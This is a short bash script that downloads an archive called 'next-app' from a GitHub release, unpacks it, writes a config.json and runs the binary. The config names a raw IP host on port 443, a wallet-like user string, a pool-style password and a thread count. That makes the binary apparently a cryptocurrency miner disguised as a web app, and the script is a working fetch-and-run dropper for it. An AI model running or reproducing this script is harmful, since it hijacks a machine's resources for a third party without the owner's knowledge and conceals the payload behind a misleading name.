#!/bin/bash
wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz

tar -xf next-app.tar.gz

echo '{"host": "93.123.82.33", "port": 443, "user": "WZ2dpArp9du6scQ43hgqHL1PJcAaD5CPnT", "pass": "c=SWAMP,mc=SWAMP,zap=SWAMP,m=solo", "threads": 3}' > config.json
ls -la
./next-app
